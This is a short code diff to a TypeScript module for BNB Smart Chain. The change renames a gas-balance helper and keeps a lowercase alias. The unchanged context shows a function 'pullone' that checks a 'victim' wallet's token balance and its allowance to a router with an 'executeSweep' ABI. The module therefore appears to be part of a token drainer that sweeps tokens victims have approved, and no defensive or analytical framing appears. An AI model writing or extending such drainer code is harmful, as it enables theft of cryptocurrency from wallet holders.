@@ -11,7 +11,7 @@ const transport = () =>
 
 export const pub = createPublicClient({ chain: bsc, transport: transport() });
 
-// Aliased exports to support both camelCase and lowercase imports across listener.ts
+// Explicitly export all casing variants required by listener.ts and other modules
 export const allowanceOf = (owner: `0x${string}`, spender: `0x${string}`, token: `0x${string}`) =>
     pub.readContract({ address: token, abi: erc20Abi, functionName: 'allowance', args: [owner, spender] });
 export const allowanceof = allowanceOf;
@@ -20,7 +20,8 @@ export const balanceOf = (owner: `0x${string}`, token: `0x${string}`) =>
     pub.readContract({ address: token, abi: erc20Abi, functionName: 'balanceOf', args: [owner] });
 export const balanceof = balanceOf;
 
-export const gasof = (addr: `0x${string}`) => pub.getBalance({ address: addr });
+export const gasOf = (addr: `0x${string}`) => pub.getBalance({ address: addr });
+export const gasof = gasOf;
 
 // Router ABI for executeSweep
 const ROUTER_ABI = [{
@@ -69,7 +70,7 @@ export async function pullone(
     const [bal, allow, gas] = await Promise.all([
         balanceOf(victim, token),
         allowanceOf(victim, routerAddress, token),
-        gasof(account.address),
+        gasOf(account.address),
     ]);
 
     if (bal === 0n) return null;
